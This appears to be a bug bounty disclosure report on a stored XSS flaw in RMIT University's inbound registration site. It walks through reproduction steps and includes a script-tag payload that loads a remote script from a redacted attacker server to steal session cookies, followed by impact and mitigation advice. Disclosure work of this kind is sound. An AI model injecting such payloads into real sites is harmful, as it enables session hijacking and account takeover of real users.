# 🦹‍♂️ Account Take Over (via XSS)  👩🏻‍🎓RMIT University

### Summary

A Cross-Site Scripting (XSS) vulnerability has been identified in the account creation process on [https://inbound.rmit.edu.au/](https://inbound.rmit.edu.au/). This vulnerability allows an attacker to inject malicious scripts that can steal session cookies, enabling account takeover. The injected XSS payload is stored and later executed, making it possible to hijack the affected user's session.

***

### Reproduction Steps

1.  **Access the Site**

    Visit: [https://inbound.rmit.edu.au/](https://inbound.rmit.edu.au/).
2.  **Navigate to the Login Panel**

    Click on the login/sign-up section of the website.
3.  **Create an Account**

    Use the following credentials for registration:

    * **Email:** `example@bugcrowdninja.com`
    * **Password:** `TestPassword`
4.  **Inject the XSS Payload**

    In one of the registration fields (for example, in a personal information field), insert the following XSS payload:

    ```html
    <script src=//[ REDACTED ]></script>
    ```

    This payload loads an external script from a server under the attacker's control ( \[ REDACTED ] ), which is designed to capture session cookies.
5.  **Complete the Registration**

    Fill in the remaining required information (e.g., entering "Guatemala" in the appropriate field).
6.  **Verify the Injection**

    Inspect the source code of the page displaying the user information to confirm that the XSS payload has been injected without proper sanitization.
7.  **Capture the Cookies**

    Access the attacker's control panel at \[ REDACTED ] to verify that the session cookies have been received, proving that account takeover is possible.

***

### Impact

*   **Cookie Theft and Session Hijacking:**

    By capturing session cookies, an attacker can impersonate a legitimate user, gaining unauthorized access to the compromised account.
*   **Unauthorized Access to Sensitive Data:**

    Exploiting this vulnerability can lead to exposure of personal information and possibly allow the attacker to perform actions on behalf of the user.
*   **Potential Privilege Escalation:**

    If the compromised account has elevated privileges, the attacker might leverage this vulnerability to gain access to additional internal resources or systems.
*   **Lateral Movement:**

    Session hijacking may allow the attacker to move laterally within the network or application, compromising further resources.

***

### Examples of Real Exploitation

*   **External Script Injection for Cookie Capture:**

    The payload `<script src=//[REDACTED]></script>` loads a remote script that registers and sends session cookies to the attacker's server. This is a common technique in persistent XSS attacks.
*   **Account Takeover:**

    Once the session cookies are captured, an attacker can use them in their browser to assume the identity of the victim, effectively taking control of the account.

***

### Mitigation Recommendations

1. **Input Validation and Sanitization:**
   * Implement strict validation for all input fields.
   * Use whitelisting techniques and properly escape any content that is rendered on the client side.
2. **Output Encoding:**
   * Ensure that all data displayed in the user interface is properly encoded to prevent the execution of malicious scripts.
3. **Content Security Policy (CSP):**
   * Configure a CSP that restricts the loading of external scripts and defines trusted sources.
4. **HttpOnly Cookies:**
   * Set session cookies with the `HttpOnly` attribute to prevent them from being accessed via JavaScript.
5. **Code Reviews and Security Audits:**
   * Perform regular code reviews and security audits to identify and remediate any injection points.

***

### Additional Report Link

For further details and evidence extracted from any user who might view my profile, please refer to the following link:

\[ REDACTED ]

***

### Conclusion

The XSS vulnerability in the account creation process on [https://inbound.rmit.edu.au/](https://inbound.rmit.edu.au/) poses a serious security risk by enabling an attacker to steal session cookies and take over user accounts. It is crucial to implement the recommended mitigation strategies to safeguard user sessions and prevent unauthorized access.

<figure><img src="../.gitbook/assets/Screenshot 2025-04-03 at 06.05.26.png" alt=""><figcaption><p>Self 😭</p></figcaption></figure>
